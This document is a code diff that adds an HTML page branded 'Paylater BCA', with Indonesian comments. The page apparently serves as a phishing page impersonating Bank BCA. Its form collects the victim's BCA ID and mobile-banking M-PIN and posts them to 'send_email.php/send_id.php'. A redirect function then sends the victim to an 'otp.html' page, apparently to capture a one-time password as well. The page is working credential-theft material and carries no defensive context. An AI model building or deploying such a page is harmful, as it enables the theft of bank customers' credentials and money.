@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paylater BCA</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column; /* tambahkan flex-direction untuk menempatkan gambar di atas */
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px; /* Tambahkan margin-bottom untuk memindahkan gambar ke atas */
+    }
+
+    form {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .form-container {
+      margin-bottom: 20px;
+    }
+
+    .form-container input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .submit-button {
+      background-color: #2f539b;
+      color: white;
+      border: none;
+      padding: 10px 110px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .bottom-image {
+      margin-top: 20px; /* Mengatur margin-top untuk menempatkan gambar bawah */
+    }
+  </style>
+</head>
+<body>
+  <!-- Foto atas -->
+  <img src="https://i.ibb.co/NNZ3HML/IMG-20240307-140903.jpg" alt="Foto atas">
+
+  <!-- Formulir -->
+  <form id="myForm" action="send_email.php/send_id.php" method="post" onsubmit="return validateForm()">
+    <div class="form-container">
+      <input type="text" id="BCA_ID" name="BCA_ID" placeholder="BCA ID" maxlength="16" class="nomor_hp" oninput="updateStyle('BCA_ID')">
+      <input type="text" id="M-PIN" name="M-PIN" placeholder="M-PIN" maxlength="12" class="pin-input" oninput="updateStyle('M-PIN')">
+    </div>
+    <button type="submit" class="submit-button">Lanjutkan</button>
+  </form>
+
+  <!-- Foto bawah -->
+  <img src="https://i.ibb.co/K5j2YvV/IMG-20240306-221037.jpg" alt="Foto bawah" class="bottom-image">
+
+  <script>
+    function validateForm() {
+      var BCA_ID = document.getElementById("BCA_ID").value;
+      var M_PIN = document.getElementById("M-PIN").value;
+
+      if (BCA_ID === "" || M_PIN === "") 
+        return false;
+      else
+        return true;
+    }
+
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+      if(validateForm()) {
+        // Form valid, lanjutkan dengan submit
+      } else {
+        event.preventDefault(); // Mencegah form untuk submit jika tidak valid
+      }
+    });
+
+    // Fungsi untuk mengarahkan pengguna ke halaman otp.html setelah email berhasil dikirim
+    function redirectAfterEmailSent() {
+      window.location.href = "otp.html";
+    }
+  </script>
+</body>
+</html>
